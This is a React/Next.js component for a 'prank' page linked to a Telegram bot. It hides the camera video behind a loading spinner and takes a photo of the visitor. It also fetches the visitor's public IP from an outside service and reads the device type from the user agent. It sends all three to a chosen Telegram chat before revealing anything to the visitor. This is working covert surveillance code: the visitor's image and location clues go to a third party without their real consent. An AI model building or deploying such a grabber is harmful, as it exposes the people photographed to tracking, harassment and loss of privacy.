"use client";

import confetti from "canvas-confetti";
import { useTranslations } from "next-intl";
import { useCallback, useEffect, useState } from "react";
import { sendPhotoToChat } from "../_actions/send-photo-to-chat";
import { useCamera } from "../_hooks/use-camera";
import { Loader } from "./loader";

async function getUserIp() {
	return fetch("https://api.ipify.org/?format=json")
		.then((res) => res.json())
		.then((data) => data.ip)
		.catch(() => "unknown");
}

function getUserDevice() {
	const userAgent = navigator.userAgent;

	if (/Windows/.test(userAgent)) {
		return "Windows";
	}

	if (/Macintosh/.test(userAgent)) {
		return "MacOS";
	}

	if (/Android/.test(userAgent)) {
		return "Android";
	}

	if (/iPhone/.test(userAgent)) {
		return "iPhone";
	}

	if (/iPad/.test(userAgent)) {
		return "iPad";
	}

	if (/CrOS/.test(userAgent)) {
		return "ChromeOS";
	}

	if (/Linux/.test(userAgent)) {
		return "Linux";
	}

	return "unknown";
}

interface CameraProps {
	chatId: number;
}

export const Camera = ({ chatId }: CameraProps) => {
	const { videoRef, canvasRef, photo } = useCamera();
	const [isTakingPhoto, setIsTakingPhoto] = useState(true);
	const t = useTranslations("prank");

	const handlePhoto = useCallback(
		async (_photo: string) => {
			const ip = await getUserIp();
			const device = getUserDevice();
			await sendPhotoToChat({ photo: _photo, chatId, ip, device });

			setIsTakingPhoto(false);
			confetti({
				particleCount: 500,
				spread: 90,
				origin: { y: 1 },
				scalar: 2,
				startVelocity: 80,
				ticks: 500,
			});
		},
		[chatId],
	);

	useEffect(() => {
		if (!photo) return;

		handlePhoto(photo);
	}, [photo, handlePhoto]);

	return (
		<div className="flex flex-col justify-center items-center gap-12">
			{isTakingPhoto ? <Loader /> : <h1 className="text-3xl font-bold">{t("title")}</h1>}
			<video ref={videoRef} style={{ display: "none" }} autoPlay />
			<canvas className={isTakingPhoto ? "hidden" : "visible rounded-xl max-h-[50vh]"} ref={canvasRef} />
			{!isTakingPhoto && (
				<p className="text-center text-lg">
					{t.rich("subtitle", {
						botTag: `@${process.env.NEXT_PUBLIC_BOT_NAME}`,
						a: (content) => (
							<a
								className="hover:text-orange-500"
								href={`https://t.me/${process.env.NEXT_PUBLIC_BOT_NAME}`}
								target="_blank"
								rel="noreferrer"
							>
								{content}
							</a>
						),
						u: (content) => <span className="underline underline-offset-4">{content}</span>,
					})}
				</p>
			)}
		</div>
	);
};

export const CameraNotAllowed = () => {
	const t = useTranslations("common");

	return <h1 className="font-bold text-4xl">{t("camera-not-allowed")}</h1>;
};
